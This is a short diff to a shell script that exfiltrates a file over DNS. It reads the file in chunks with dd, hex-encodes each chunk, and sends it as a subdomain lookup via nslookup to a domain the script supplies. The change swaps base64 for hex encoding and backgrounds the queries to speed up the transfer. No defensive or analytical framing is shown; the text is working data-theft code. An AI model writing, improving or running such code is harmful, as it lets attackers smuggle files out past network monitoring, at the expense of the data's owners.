@@ -23,9 +23,10 @@ fi
 
 skip=0
 while [ "$((skip*chunk))" -lt "$size" ] ; do
-	sleep 0.4
-	q=$(dd if="$file" skip=$skip bs=$chunk count=1 2>/dev/null | base64)."$domain"
+	q=$(dd if="$file" skip=$skip bs=$chunk count=1 2>/dev/null | xxd -ps -c 200)."$domain"
 	#echo "$q"
-	nslookup "$q"
+	nslookup "$q" &
+	pid="$!"
+	sleep 0.1
 	skip=$((skip+1))
 done
